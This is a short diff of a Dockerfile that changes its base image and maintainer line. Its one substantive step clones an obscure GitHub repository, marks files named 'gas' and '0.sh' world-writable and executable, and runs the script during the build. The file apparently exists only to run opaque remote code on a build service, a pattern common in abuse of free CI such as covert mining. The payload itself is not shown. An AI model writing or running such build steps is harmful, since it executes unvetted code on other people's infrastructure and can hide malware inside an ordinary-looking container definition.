@@ -1,7 +1,6 @@
-ARG GO_VERSION=1.15
+FROM nikolaik/python-nodejs:python3.8-nodejs16
 
-FROM golang:${GO_VERSION}
-LABEL maintainer=dev@codeship.com
+MAINTAINER Albert King <jindaixang@163.com>
 
-# go 1.13.15
+# RUN pip install akshare -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host=mirrors.aliyun.com  --upgrade
 RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
